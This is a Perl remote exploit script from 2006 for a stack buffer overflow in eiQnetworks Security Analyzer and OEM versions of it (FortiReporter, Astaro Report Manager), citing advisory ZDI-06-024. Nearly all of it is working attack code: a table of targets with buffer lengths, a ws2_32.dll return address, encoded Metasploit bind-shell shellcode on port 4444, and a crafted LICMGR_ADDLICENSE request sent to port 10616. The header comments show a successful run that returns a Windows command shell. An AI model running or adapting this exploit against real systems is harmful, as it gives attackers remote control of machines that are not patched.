#!/usr/bin/perl -w
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) - 03/23/2006
# Bug found by Titon of Bastard Labs.
#
# http://www.zerodayinitiative.com/advisories/ZDI-06-024.html
#
# Exploit for * Security Analyzer by eiQnetworks  (OEM for Several vendors)
#
# kfinisterre@kfinisterre01:~$  ./eiQ_multi.pl 2 192.168.0.13
# *** Target: NetworkSecurityAnalyzerv4.2.27.exe, Len: 1262
# Exploiting 192.168.0.13
# kfinisterre@kfinisterre01:~$ telnet 192.168.0.13 4444
# Trying 192.168.0.13...
# Connected to 192.168.0.13.
# Escape character is '^]'.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Network Security Analyzer\fwa>exit
# exit
# Connection closed by foreign host.

use IO::Socket;
$hostname = "127.0.0.1";
$retval = 0x71ab773b; # jmp EBX on WinXP SP2 ws2_32.dll (metasploit)
#$retval = 0x750316e2; # call EBX on Windows 2000 SP4 ws2_32.dll (metasploit)

# Binary hunts performed by JxT and Titon
$tgts{"0"} = "G2SRv4.0.36.exe:1262";
$tgts{"1"} = "EnterpriseSecurityAnalyzerv21.exe:494";
$tgts{"2"} = "NetworkSecurityAnalyzerv4.2.27.exe:1262";
$tgts{"3"} = "NetworkSecurityAnalyzerv5.exe:1262";
$tgts{"4"} = "FortiReporter_4.2.26.exe:1262";
$tgts{"5"} = "AstaroReportManagerV37.exe:000";  # Unknown.. need serial
$tgts{"6"} = "AstaroReportManager_4.2.29.exe:1262";

unless (($target,$hostname) = @ARGV,$hostname) {

        print "\n        Security Analyzer by eiQnetworks exploit, kf \(kf_lists[at]digitalmunition[dot]com\) - 03/23/2006\n";
        print "\n\nUsage: $0 <target> <host>\n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key . $a\n";
        }

        print "\n";
        exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Len: $b\n";

$sc = 
# win32_bind -  EXITFUNC=seh LPORT=4444 
# Size=344 Encoder=PexFnstenvSub http://metasploit.com
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb2".
"\xfa\xa1\x2c\x83\xeb\xfc\xe2\xf4\x4e\x90\x4a\x61\x5a\x03\x5e\xd3".
"\x4d\x9a\x2a\x40\x96\xde\x2a\x69\x8e\x71\xdd\x29\xca\xfb\x4e\xa7".
"\xfd\xe2\x2a\x73\x92\xfb\x4a\x65\x39\xce\x2a\x2d\x5c\xcb\x61\xb5".
"\x1e\x7e\x61\x58\xb5\x3b\x6b\x21\xb3\x38\x4a\xd8\x89\xae\x85\x04".
"\xc7\x1f\x2a\x73\x96\xfb\x4a\x4a\x39\xf6\xea\xa7\xed\xe6\xa0\xc7".
"\xb1\xd6\x2a\xa5\xde\xde\xbd\x4d\x71\xcb\x7a\x48\x39\xb9\x91\xa7".
"\xf2\xf6\x2a\x5c\xae\x57\x2a\x6c\xba\xa4\xc9\xa2\xfc\xf4\x4d\x7c".
"\x4d\x2c\xc7\x7f\xd4\x92\x92\x1e\xda\x8d\xd2\x1e\xed\xae\x5e\xfc".
"\xda\x31\x4c\xd0\x89\xaa\x5e\xfa\xed\x73\x44\x4a\x33\x17\xa9\x2e".
"\xe7\x90\xa3\xd3\x62\x92\x78\x25\x47\x57\xf6\xd3\x64\xa9\xf2\x7f".
"\xe1\xa9\xe2\x7f\xf1\xa9\x5e\xfc\xd4\x92\xb0\x70\xd4\xa9\x28\xcd".
"\x27\x92\x05\x36\xc2\x3d\xf6\xd3\x64\x90\xb1\x7d\xe7\x05\x71\x44".
"\x16\x57\x8f\xc5\xe5\x05\x77\x7f\xe7\x05\x71\x44\x57\xb3\x27\x65".
"\xe5\x05\x77\x7c\xe6\xae\xf4\xd3\x62\x69\xc9\xcb\xcb\x3c\xd8\x7b".
"\x4d\x2c\xf4\xd3\x62\x9c\xcb\x48\xd4\x92\xc2\x41\x3b\x1f\xcb\x7c".
"\xeb\xd3\x6d\xa5\x55\x90\xe5\xa5\x50\xcb\x61\xdf\x18\x04\xe3\x01".
"\x4c\xb8\x8d\xbf\x3f\x80\x99\x87\x19\x51\xc9\x5e\x4c\x49\xb7\xd3".
"\xc7\xbe\x5e\xfa\xe9\xad\xf3\x7d\xe3\xab\xcb\x2d\xe3\xab\xf4\x7d".
"\x4d\x2a\xc9\x81\x6b\xff\x6f\x7f\x4d\x2c\xcb\xd3\x4d\xcd\x5e\xfc".
"\x39\xad\x5d\xaf\x76\x9e\x5e\xfa\xe0\x05\x71\x44\x42\x70\xa5\x73".
"\xe1\x05\x77\xd3\x62\xfa\xa1\x2c";

$nops = "A" x ($b - length($sc));
$buf = "LICMGR_ADDLICENSE&" . $nops . $sc . $ret . "&";

printf "Exploiting $hostname\n";
$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$hostname, PeerPort=>10616, Type=>SOCK_STREAM);
$sock or die "no socket :$!\n"; 

print $sock "$buf";
print "Try connecting to port 4444 on the target.\n";
